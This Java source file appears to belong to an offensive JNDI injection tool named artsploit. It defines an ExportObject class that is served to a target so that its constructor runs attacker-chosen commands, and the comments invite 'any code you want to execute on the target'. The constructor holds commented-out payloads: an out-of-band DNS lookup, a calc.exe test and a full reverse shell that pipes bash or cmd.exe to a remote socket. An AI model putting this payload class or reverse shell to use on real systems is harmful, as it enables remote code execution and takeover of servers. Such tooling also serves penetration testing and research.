package artsploit;

import javax.naming.Context;
import javax.naming.Name;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Hashtable;

/**
 * ExportObject class is served via HTTP for URLClassloaders
 * the bytecode of this constructor is patched in the {@link HttpServer} class
 *  by adding a new Runtime.exec(Config.command) to the top of the constructor
 *  feel free to any code you want to execute on the target here
 */
public class ExportObject implements javax.naming.spi.ObjectFactory {
    public ExportObject() {
        try {
            //oob check
//            Runtime.getRuntime().exec("nslookup jndi.x.artsploit.com");
//            Runtime.getRuntime().exec("calc.exe");

            //Pure Groovy/Java Reverse Shell
            //snatched from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
//            String lhost = "127.0.0.1";
//            int lport = 8080;
////            String cmd = "cmd.exe"; //win
//            String cmd="/bin/bash"; //linux
//            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
//            Socket s = new Socket(lhost,lport);
//            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
//            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
//            while(!s.isClosed()) {
//                while(pi.available() > 0)
//                    so.write(pi.read());
//                while(pe.available() > 0)
//                    so.write(pe.read());
//                while(si.available() > 0)
//                    po.write(si.read());
//                so.flush();
//                po.flush();
//                Thread.sleep(50);
//                try {
//                    p.exitValue();
//                    break;
//                } catch (Exception e){
//
//                }
//            }
//            p.destroy();
//            s.close();

        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return null;
    }
}